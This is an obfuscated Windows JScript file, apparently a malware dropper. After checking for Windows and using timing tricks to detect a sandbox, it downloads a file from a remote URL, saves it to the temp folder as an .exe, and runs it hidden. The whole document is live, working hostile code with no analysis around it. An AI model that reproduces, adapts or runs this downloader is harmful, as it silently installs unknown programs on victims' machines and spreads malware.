var _E = false;
var _ZH = "CreateObject";
var _ME = function _J() {return WScript[_ZH]("WScript"+".Shell");}(), _OC = 11;
var _VG = "MSXML2.XMLHTTP";
var _A1 = 2123213;
var _P = 0;
function _GY(_RU){_ME["Run"](_RU, _P, _P);};
function _FK(){return _VG + "";};
function _H(_P1, _EF){_P = _P * 1; return _P1 - _EF;};
function _NN(){return _ZH;};
/*@cc_on
  @if (@_win32 || @_win64)
    _E = true;
  @end
@*/
if (_E)
{
var _A0 = "";
function _TM(){return 22;};
var _AI = 0; var _B = 0;
function _V()
{
var _F = new this["Date"]();
var _R = _F["getUTCMilliseconds"]();
WScript["Sleep"](_TM());
var _F = new this["Date"]();
var _JI = _F["getUTCMilliseconds"]();
WScript["Sleep"](_TM());
var _F = new this["Date"]();
var _O = _F["getUTCMilliseconds"]();
var _AI = "_C";
_AI = _H(_JI, _R);
var _B = "_UJ";
_B = _H(_O, _JI);
_A0 = "open";
return _H(_AI, _B);
}
var _HP = false;
var _K = false;
for (var _G = _P; _G < _TM() * 1; _G++){if (_V() != _P){
_HP = true; 
_B = "31" + 11 * _AI + _B; 
_K = true; 
break;
}}
function _A() {return ((_HP == true) && (_HP == _K)) ? 1 : _P;};
if (_HP && _A() && _K){
function _KT() {return _ME["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "cQvZxdPE2a9bB.ex" + "e";};
 _X = _FK();
 _H0 = WScript[_ZH](_X);
 var _QK = 1;
 while (_QK){
try {
	if (_QK == 1)
	{
		_H0[_A0]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_H0["send"]();
		_HJ = "Sleep";
	}
	WScript[_HJ](_TM() + 120); 
	if (_H0["readystate"] < 2 * 2) continue;
	_QK = _P;
	function _CT(_Y) {var _P0 = (1, 2, 3, 4, 5, _Y); return _P0;};
	_H1 = WScript[_NN()]("ADODB.Stream");
	_X = _H1;
	_X[_A0]();
	_X["type"] = _CT(1);
	_X["write"](_H0["ResponseBody"]);
	_H1["position"] = _CT(_P);
	_X["Save" + "ToFile"](_KT(), 2);
	_H1["cl"+"ose"]();
	_N = _KT();
	_GY(_N);
} catch(_G0){};
}
}
}

